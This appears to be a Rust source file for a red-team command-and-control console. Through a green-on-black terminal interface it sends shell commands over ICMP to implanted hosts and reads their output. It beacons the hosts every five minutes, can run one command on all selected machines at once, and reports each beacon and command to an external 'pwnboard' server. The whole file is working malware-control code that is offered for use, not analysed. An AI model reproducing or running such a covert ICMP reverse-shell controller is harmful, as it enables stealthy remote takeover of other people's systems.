use crate::{icmp::IcmpListener, vars::CMD_END};
use cursive::{
    align::HAlign,
    event::Key,
    menu,
    theme::{BaseColor, BorderStyle, Color},
    traits::*,
    utils::Counter,
    view::ScrollStrategy,
    views::{
        Button, Dialog, EditView, LinearLayout, PaddedView, ProgressBar, ScrollView, SelectView,
        TextView,
    },
    Cursive,
};
use serde::{Deserialize, Serialize};
use serde_json::from_str;
use std::{
    collections::HashMap,
    fs::read_to_string,
    io::{Read, Write},
    sync::{Arc, Mutex},
    thread,
    time::Duration,
};

#[derive(Debug, Serialize, Deserialize, Clone)]
struct Config {
    teams: u8,
    setup: Vec<Preset>,
}

#[derive(Debug, Serialize, Deserialize, Clone)]
struct Preset {
    ip: String,
    hostname: String,
    os: String,
}

#[derive(Clone)]
struct Host {
    ip: String,
    team: u8,
    hostname: String,
    os: String,
    connected: bool,
}

pub fn main(config: Option<&String>, interface: String) {
    let config: Config = read_to_string(config.unwrap_or(&"config.json".to_owned()))
        .map(|config_file| from_str(&config_file))
        .unwrap()
        .unwrap();
    let config_teams = config.clone();
    let config_boxes = config.clone();

    let hosts = Arc::new(Mutex::new(Vec::<Host>::new()));
    get_team_ip(&config, &hosts);
    let listener = Arc::new(Mutex::new(IcmpListener::new(interface)));

    let all_hosts_arc = hosts.clone();
    let connected_hosts_arc = hosts.clone();
    let os_hosts_arc = hosts.clone();
    let teams_hosts_arc = hosts.clone();
    let boxes_hosts_arc = hosts.clone();

    let table_listener_arc = listener.clone();
    let select_all_listener_arc = listener.clone();
    let timeout_listener_arc = listener.clone();

    thread::spawn(move || {
        scan(hosts.clone(), listener.clone());
    });

    let mut siv = cursive::default();
    siv.set_autorefresh(true);

    let mut theme = siv.current_theme().clone();

    theme.borders = BorderStyle::Outset;
    theme
        .palette
        .set_color("Background", Color::Light(BaseColor::Black));
    theme.palette.set_color("Shadow", Color::Rgb(8, 51, 4));
    theme.palette.set_color("Primary", Color::Rgb(32, 194, 14));
    theme
        .palette
        .set_color("Secondary", Color::Rgb(32, 194, 14));
    theme.palette.set_color("Tertiary", Color::Rgb(32, 194, 14));
    theme
        .palette
        .set_color("View", Color::Dark(BaseColor::Black));
    theme
        .palette
        .set_color("TitlePrimary", Color::Rgb(32, 194, 14));
    theme
        .palette
        .set_color("Highlight", Color::Rgb(32, 194, 14));
    theme
        .palette
        .set_color("HighlightText", Color::Dark(BaseColor::Black));
    theme
        .palette
        .set_color("HighlightInactive", Color::Rgb(8, 51, 4));
    siv.set_theme(theme);

    let table = LinearLayout::horizontal()
        .child(ScrollView::new(
            SelectView::<Host>::new()
                .h_align(HAlign::Center)
                .on_submit(move |siv, host: &Host| {
                    let h = host.clone();
                    let pick_object_listener_arc = table_listener_arc.clone();
                    pick_object(siv, h, pick_object_listener_arc);
                })
                .with_name("table"),
        ))
        .child(PaddedView::lrtb(
            2,
            2,
            0,
            0,
            Button::new("Select All", move |s| {
                let select_all_listener_arc_internal = select_all_listener_arc.clone();
                select_all(s, select_all_listener_arc_internal);
            }),
        ));

    siv.menubar()
        .add_leaf("Connected Systems", move |s| {
            if let Ok(t) = connected_hosts_arc.lock() {
                s.call_on_name("table", |view: &mut SelectView<Host>| {
                    view.clear();
                    for host in (*t).iter().cloned() {
                        if host.connected {
                            view.add_item(host.ip.clone(), host);
                        }
                    }
                });
            }
        })
        .add_leaf("All Systems", move |s| {
            if let Ok(t) = all_hosts_arc.lock() {
                s.call_on_name("table", |view: &mut SelectView<Host>| {
                    view.clear();
                    for host in (*t).iter().cloned() {
                        view.add_item(host.ip.clone(), host);
                    }
                });
            }
        })
        .add_subtree(
            "OS",
            menu::Tree::new().with(move |tree| {
                let tree_os_hosts_arc = os_hosts_arc.clone();
                tree_os(tree, tree_os_hosts_arc);
            }),
        )
        .add_subtree(
            "Teams",
            menu::Tree::new().with(move |tree| {
                let tree_teams_hosts_arc = teams_hosts_arc.clone();
                tree_teams(tree, tree_teams_hosts_arc, config_teams);
            }),
        )
        .add_subtree(
            "Boxes",
            menu::Tree::new().with(move |tree| {
                let tree_boxes_hosts_arc = boxes_hosts_arc.clone();
                tree_boxes(tree, tree_boxes_hosts_arc, config_boxes);
            }),
        )
        .add_leaf("Set Timeout", move |s| {
            let listener = timeout_listener_arc.clone();
            s.add_layer(
                Dialog::new()
                    .title("Enter timeout in seconds")
                    .padding_lrtb(1, 1, 1, 0)
                    .content(EditView::new().with_name("timeout").fixed_width(20))
                    .button("Ok", move |s2| {
                        let timeout_secs: u64 = match s2
                            .call_on_name("timeout", |view: &mut EditView| view.get_content())
                            .unwrap()
                            .parse()
                        {
                            Ok(num) => num,
                            Err(_) => return,
                        };
                        if let Ok(mut listen) = listener.lock() {
                            listen.set_timeout(Duration::from_secs(timeout_secs));
                        }
                        s2.pop_layer();
                    }),
            );
        })
        .add_delimiter()
        .add_leaf("Quit", |s| s.quit());

    siv.add_global_callback(Key::Esc, |s| s.select_menubar());

    siv.add_layer(Dialog::around(table).title("Available Clients"));

    siv.run();
}

fn pick_object(siv: &mut Cursive, host: Host, listener: Arc<Mutex<IcmpListener>>) {
    siv.add_layer(
        Dialog::new()
            .title(format!("{}", host.ip))
            .padding_lrtb(1, 1, 1, 0)
            .content(
                LinearLayout::vertical()
                    .child(
                        ScrollView::new(TextView::empty().with_name("shellout"))
                            .scroll_strategy(ScrollStrategy::StickToBottom),
                    )
                    .child(
                        EditView::new()
                            .on_submit(move |s, cmd| {
                                let cmd_string = String::from(cmd);
                                let cmd_string2 = String::from(cmd);
                                let output = Arc::new(Mutex::new(String::new()));
                                let output2 = output.clone();
                                let l2 = listener.clone();
                                let hosts = vec![host.clone()];
                                s.add_layer(
                                    Dialog::around(
                                        ProgressBar::new()
                                            .max(1)
                                            .with_task(move |counter| {
                                                shell(cmd_string, hosts, l2, output2, &counter)
                                            })
                                            .with_name("progress")
                                            .full_width(),
                                    )
                                    .button("Ok", move |s| {
                                        let cmd_string3 = String::from(&cmd_string2);
                                        s.pop_layer();
                                        let output_string = output.lock().unwrap().to_string();
                                        update_shell_prompt(s, cmd_string3, output_string);
                                    })
                                    .title("Progress"),
                                );
                            })
                            .with_name("shell"),
                    ),
            )
            .button("Exit", |s| {
                s.pop_layer();
            }),
    );
}

fn shell(
    cmd: String,
    hosts: Vec<Host>,
    listener_arc: Arc<Mutex<IcmpListener>>,
    final_out: Arc<Mutex<String>>,
    counter: &Counter,
) {
    if let Ok(mut final_out_lock) = final_out.lock() {
        if cmd == "clear" {
            return;
        }
        let mut shell_out = String::new();
        let mut listener = listener_arc.lock().unwrap();

        eprintln!("Added layer");
        for mut h in hosts {
            listener.set_dest(h.ip.clone().parse().unwrap());
            listener.write(cmd.as_bytes()).unwrap();
            let mut first = true;
            loop {
                let mut buffer = [0; 250000];
                let output = listener.read(&mut buffer).unwrap();
                if output == 0 {
                    shell_out.push_str(&format!("{} < CONNECTION LOST\n", &h.ip));
                    h.connected = false;
                    break;
                }
                let outstr = String::from_utf8(Vec::from(buffer)).unwrap();
                let outstr = outstr.trim_matches(char::from(0));
                let mut end_check = String::from(outstr);
                let outstr = match outstr.strip_suffix(CMD_END) {
                    Some(x) => x,
                    None => outstr,
                };
                let printed = match first {
                    true => {
                        first = false;
                        notify_pwnboard(&h.ip, "RSHELL - Command");
                        format!("{} < {}", &h.ip, outstr,)
                    }
                    false => {
                        format!("{}", outstr,)
                    }
                };
                shell_out.push_str(&printed);
                if end_check.len() >= 4 {
                    let _ = end_check.drain(..end_check.len() - 4);
                    if end_check == CMD_END {
                        break;
                    }
                }
            }
            shell_out.push_str("\n");

            counter.tick(1);
        }

        *final_out_lock = shell_out;
    }
}

fn update_shell_prompt(s: &mut Cursive, cmd: String, output: String) {
    if cmd == "clear" {
        s.call_on_name("shell", |view: &mut EditView| {
            view.set_content("");
        })
        .unwrap();
        s.call_on_name("shellout", |view: &mut TextView| {
            view.set_content("");
        })
        .unwrap();
        return;
    }
    s.call_on_name("shellout", |view: &mut TextView| {
        view.get_shared_content().append(output);
    });
    s.call_on_name("shell", |view: &mut EditView| {
        view.set_content("");
    })
    .unwrap();
}

fn select_all(s: &mut Cursive, listener: Arc<Mutex<IcmpListener>>) {
    let count = s
        .call_on_name("table", |view: &mut SelectView<Host>| view.len())
        .unwrap();
    s.add_layer(
        Dialog::new()
            .title("All")
            .padding_lrtb(1, 1, 1, 0)
            .content(
                LinearLayout::vertical()
                    .child(ScrollView::new(TextView::empty().with_name("shellout")))
                    .child(
                        EditView::new()
                            .on_submit(move |s, cmd| {
                                let cmd_string = String::from(cmd);
                                let cmd_string2 = String::from(cmd);
                                let output = Arc::new(Mutex::new(String::new()));
                                let output2 = output.clone();
                                let l2 = listener.clone();
                                let hosts = s
                                    .call_on_name("table", |view: &mut SelectView<Host>| {
                                        view.iter().map(|(_, y)| y).cloned().collect::<Vec<Host>>()
                                    })
                                    .unwrap();
                                s.add_layer(
                                    Dialog::around(
                                        ProgressBar::new()
                                            .max(count)
                                            .with_task(move |counter| {
                                                shell(cmd_string, hosts, l2, output2, &counter)
                                            })
                                            .with_name("progress")
                                            .full_width(),
                                    )
                                    .button("Ok", move |s| {
                                        let cmd_string3 = String::from(&cmd_string2);
                                        s.pop_layer();
                                        let output_string = output.lock().unwrap().to_string();
                                        update_shell_prompt(s, cmd_string3, output_string);
                                    })
                                    .title("Progress"),
                                );
                            })
                            .with_name("shell"),
                    ),
            )
            .button("Exit", |s| {
                s.pop_layer();
            }),
    );
}

fn tree_os(tree: &mut menu::Tree, hosts_arc: Arc<Mutex<Vec<Host>>>) {
    for os in ["WINDOWS", "LINUX", "BSD", "OTHER"] {
        let leaf_hosts_arc = hosts_arc.clone();
        tree.add_item(menu::Item::leaf(format!("{}", os), move |s| {
            if let Ok(t) = leaf_hosts_arc.lock() {
                s.call_on_name("table", |view: &mut SelectView<Host>| {
                    view.clear();
                    for host in (*t).iter().filter(|x| x.os == os).cloned() {
                        view.add_item(host.ip.clone(), host);
                    }
                });
            }
        }))
    }
}

fn tree_boxes(tree: &mut menu::Tree, hosts_arc: Arc<Mutex<Vec<Host>>>, config: Config) {
    for preset in config.setup {
        let hosts_arc2 = hosts_arc.clone();
        tree.add_item(menu::Item::leaf(
            format!("{} ({})", preset.ip, preset.hostname),
            move |s| {
                if let Ok(t) = hosts_arc2.lock() {
                    s.call_on_name("table", |view: &mut SelectView<Host>| {
                        view.clear();
                        for host in (*t)
                            .iter()
                            .filter(|x| x.hostname == preset.hostname)
                            .cloned()
                        {
                            view.add_item(format!("{} (Team {})", host.ip, host.team), host);
                        }
                    });
                }
            },
        ))
    }
}

fn tree_teams(tree: &mut menu::Tree, hosts_arc: Arc<Mutex<Vec<Host>>>, config: Config) {
    for i in 1..config.teams + 1 {
        let hosts_arc2 = hosts_arc.clone();
        tree.add_item(menu::Item::leaf(format!("Team {}", i), move |s| {
            if let Ok(t) = hosts_arc2.lock() {
                s.call_on_name("table", |view: &mut SelectView<Host>| {
                    view.clear();
                    for host in (*t).iter().filter(|x| x.team == i).cloned() {
                        view.add_item(host.ip.clone(), host);
                    }
                });
            }
        }))
    }
}

fn get_team_ip(config: &Config, hosts: &Arc<Mutex<Vec<Host>>>) {
    for team in 1..=config.teams {
        let mut ip_list = vec![];
        for preset in &config.setup {
            let val = if &preset.hostname == "ROUTER" {
                (8 * team) - 6
            } else {
                team
            };
            let ip = preset.ip.replace("x", &format!("{}", val));
            ip_list.push(ip.clone());
            let mut stream_lock = hosts.lock().unwrap();
            stream_lock.push(Host {
                ip,
                team,
                hostname: preset.hostname.clone(),
                os: preset.os.clone(),
                connected: false,
            });
        }
    }
}

fn scan(hosts_arc: Arc<Mutex<Vec<Host>>>, listener_arc: Arc<Mutex<IcmpListener>>) {
    loop {
        let host_copy = {
            let mut out: Vec<Host> = vec![];
            let hosts = hosts_arc.lock().unwrap();
            for host in &*hosts {
                out.push(host.clone());
            }
            out
        };
        for mut host in host_copy {
            let mut listener = listener_arc.lock().unwrap();
            listener.set_dest(host.ip.clone().parse().unwrap());
            listener.write(b"PING").unwrap();
            let mut buffer = [0; 250000];
            let output = listener.read(&mut buffer).unwrap();
            if output == 0 {
                host.connected = false;
            }
            if &buffer[0..4] == b"PONG" {
                host.connected = true;
                notify_pwnboard(&host.ip, "RSHELL - Beacon");
            }
        }
        thread::sleep(Duration::from_secs(60*5));
    }
}

fn notify_pwnboard(ip: &str, method: &str) {
    let mut map = HashMap::new();
    map.insert("ip", ip);
    map.insert("application", method);
    let client = reqwest::Client::new();
    let _res = client
        .post("http://pwnboard.win/pwn/boxaccess")
        .json(&map)
        .send();
}
